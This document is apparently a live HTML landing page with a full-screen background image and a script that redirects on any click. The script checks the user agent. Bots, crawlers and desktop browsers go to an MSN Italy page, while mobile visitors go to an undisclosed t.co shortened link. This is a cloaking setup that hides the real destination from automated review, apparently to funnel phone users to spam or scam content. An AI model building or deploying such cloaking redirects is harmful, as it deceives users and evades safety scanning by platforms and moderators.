  <title>Landing Page</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      background: url('https://i.imgur.com/QUESCLI.jpeg') no-repeat center center fixed;
      background-size: cover;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* For small phone screens */
    @media (max-width: 768px) {
      html, body {
        background-size: cover;
      }
    }
  </style>

<body>

<script>
  // URLs
  const mobileURL = "https://t.co/lU6lupZ2Qa";
  const pcURL = "https://www.msn.com/it-it";

  // Detect device and bots
  const userAgent = navigator.userAgent.toLowerCase();
  const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(userAgent);
  const isBot = /bot|crawler|spider|crawling/i.test(userAgent);

  // Click anywhere to redirect
  document.body.addEventListener("click", () => {
    if (isBot || !isMobile) {
      window.location.href = pcURL;
    } else {
      window.location.href = mobileURL;
    }
  });
</script>
